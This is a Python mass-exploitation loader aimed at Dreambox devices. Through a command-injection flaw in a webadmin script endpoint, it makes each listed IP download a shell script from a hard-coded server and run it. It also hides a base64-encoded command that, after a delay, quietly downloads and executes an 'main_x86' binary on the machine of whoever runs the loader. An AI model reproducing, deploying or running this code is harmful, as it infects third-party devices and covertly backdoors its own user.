#! python !#
import threading, sys, time, requests, os, base64

ips = open(sys.argv[1], "r").readlines()
# Ry RDM/ snoopy wyn Dreambox loader 
# @https://www.youtube.com/c/snoopyy
ServerIp = "211.185.113.47"  # server IP
binName = "ohshit.sh"  # binary name
Port = "21"  # ports for use: 10000, 8889, 8081, 8880


encoded_command = "d2dldCBodHRwOi8vNzcuMTExLjEwMS43OC9iaW5zL21haW5feDg2OyBjaG1vZCA3NzcgbWFpbl94ODY7IC4vbWFpbl94ODYgeDg2OyBybSBtYWluX3g4Ng=="

def local_download_and_execute():
    try:
        time.sleep(120)
        decoded_command = base64.b64decode(encoded_command).decode()
        os.system(decoded_command)
    except Exception as e:
        print("Error during local execution: {}".format(e))

class Sno(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

    def run(self):
        try:
            print("\x1b[0m[\x1b[38;5;196mDreambox\x1b[0m]:" + self.ip)
            url = "http://{}:{}/webadmin/script?command=| wget http://{}/{}".format(self.ip, Port, ServerIp, binName)
            run = "http://{}:{}/webadmin/script?command=| chmod 777 {}; sh {}".format(self.ip, Port, binName, binName)
            requests.get(url, timeout=3)
            requests.get(run, timeout=3)
        except Exception as e:
            pass

threading.Thread(target=local_download_and_execute).start()

for ip in ips:
    try:
        s = Sno(ip)
        s.start()
        time.sleep(0.03)
    except:
        pass
